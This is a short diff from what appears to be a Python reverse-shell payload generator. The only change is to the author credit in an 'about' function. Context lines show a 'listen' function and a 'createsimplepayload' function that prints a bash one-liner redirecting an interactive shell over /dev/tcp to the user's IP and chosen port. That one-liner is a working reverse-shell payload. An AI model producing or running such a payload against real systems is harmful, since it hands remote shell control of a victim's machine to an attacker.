@@ -47,4 +47,4 @@ def listen(port):
 def createsimplepayload(port):#let user put port in
 	print('nohup bash &> /dev/tcp/'+getip()+'/'+str(port)+' 0>&1 &')
 def about():
-	print('Version 1.0\nCreated by мишапов (@Mikhail Semenov)')
+	print('Version 1.0\nCreated by Elliot Walker (@Elliot-Walker)')
